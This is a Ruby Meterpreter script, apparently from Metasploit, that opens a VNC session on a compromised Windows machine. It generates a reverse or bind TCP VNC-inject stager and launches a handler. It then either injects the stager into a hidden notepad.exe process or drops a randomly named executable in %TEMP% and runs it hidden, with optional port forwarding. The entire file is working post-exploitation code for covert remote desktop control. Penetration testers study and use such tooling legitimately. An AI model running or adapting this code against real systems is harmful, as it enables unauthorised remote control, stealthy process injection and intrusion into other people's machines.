# $Id$
# $Revision$

#
# Meterpreter script for obtaining a quick VNC session
#

session = client

#
# Options
#
opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"],
	"-r"  => [ true,   "The IP of a remote Metasploit listening for the connect back"],
	"-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4545)"],
	"-v"  => [ true,   "The local port for the VNC proxy service (default: 5900)"],
	"-i"  => [ false,  "Inject the vnc server into a new process's memory instead of building an exe"],
	"-P"  => [ true,   "Executable to inject into (starts a new process).  Only useful with -i (default: notepad.exe)"],
	"-D"  => [ false,  "Disable the automatic multi/handler (use with -r to accept on another system)"],
	"-O"  => [ false,  "Disable binding the VNC proxy to localhost (open it to the network)"],
	"-V"  => [ false,  "Disable the automatic launch of the VNC client"],
	"-t"  => [ false,  "Tunnel through the current session connection. (Will be slower)"],
	"-c"  => [ false,  "Enable the VNC courtesy shell"]
)

#
# Default parameters
#

if (client.sock and client.sock.respond_to? :peerhost and client.sock.peerhost)
	rhost    = Rex::Socket.source_address(client.sock.peerhost)
else
	rhost    = Rex::Socket.source_address("1.2.3.4")
end
rport    = 4545
vport    = 5900
lhost    = "127.0.0.1"


autoconn = true
autovnc  = true
anyaddr  = false
courtesy = false
tunnel   = false
inject   = false
runme    = "notepad.exe"
pay      = nil

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
		print_line(opts.usage)
		raise Rex::Script::Completed
	when "-r"
		rhost = val
	when "-p"
		rport = val.to_i
	when "-v"
		vport = val.to_i
	when "-P"
		runme = val
	when "-D"
		autoconn = false
	when "-O"
		anyaddr = true
	when "-V"
		autovnc = false
	when "-c"
		courtesy = true
	when "-t"
		tunnel = true
		autoconn = true
	when "-i"
		inject = true
	end
end

#check for proper Meterpreter Platform
def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
unsupported if client.platform !~ /win32|win64/i

#
# Create the raw payload
#
if (tunnel)
	print_status("Creating a VNC bind tcp stager: RHOST=#{lhost} LPORT=#{rport}")
	payload = "windows/vncinject/bind_tcp"

	pay = client.framework.payloads.create(payload)
	pay.datastore['RHOST'] = lhost
	pay.datastore['LPORT'] = rport
	pay.datastore['VNCPORT'] = vport
else
	print_status("Creating a VNC reverse tcp stager: LHOST=#{rhost} LPORT=#{rport}")
	payload = "windows/vncinject/reverse_tcp"

	pay = client.framework.payloads.create(payload)
	pay.datastore['LHOST'] = rhost
	pay.datastore['LPORT'] = rport
	pay.datastore['VNCPORT'] = vport
end

if (not courtesy)
	pay.datastore['DisableCourtesyShell'] = true
end

if (anyaddr)
	pay.datastore['VNCHOST'] = "0.0.0.0"
end

if autoconn
	mul = client.framework.exploits.create("multi/handler")
	mul.share_datastore(pay.datastore)

	mul.datastore['WORKSPACE'] = client.workspace
	mul.datastore['PAYLOAD'] = payload
	mul.datastore['EXITFUNC'] = 'process'
	mul.datastore['ExitOnSession'] = true
	mul.datastore['WfsDelay'] = 7

	mul.datastore['AUTOVNC'] = autovnc

	print_status("Running payload handler")
	mul.exploit_simple(
		'Payload'  => mul.datastore['PAYLOAD'],
		'RunAsJob' => true
	)
end

raw = pay.generate
if (inject)
	#
	# Create a host process
	#
	pid = client.sys.process.execute("#{runme}", nil, {'Hidden' => 'true'}).pid
	print_status("Host process #{runme} has PID #{pid}")
	host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
	mem = host_process.memory.allocate(raw.length + (raw.length % 1024))

	print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
	print_status("Writing the VNC stager into memory...")
	host_process.memory.write(mem, raw)
	host_process.thread.create(mem, 0)
else
	exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
	print_status("VNC stager executable #{exe.length} bytes long")

	#
	# Upload to the filesystem
	#
	tempdir = client.fs.file.expand_path("%TEMP%")
	tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
	tempexe.gsub!("\\\\", "\\")

	fd = client.fs.file.new(tempexe, "wb")
	fd.write(exe)
	fd.close
	print_status("Uploaded the VNC agent to #{tempexe} (must be deleted manually)")

	#
	# Execute the agent
	#
	print_status("Executing the VNC agent with endpoint #{rhost}:#{rport}...")
	pid = session.sys.process.execute(tempexe, nil, {'Hidden' => true})
end

if tunnel
	# Set up a port forward for the multi/handler to use for uploading the stage
	print_status("Starting the port forwarding from #{rport} => TARGET:#{rport}")
	client.run_cmd("portfwd add -L 127.0.0.1 -l #{rport} -p #{rport} -r #{lhost}")
end

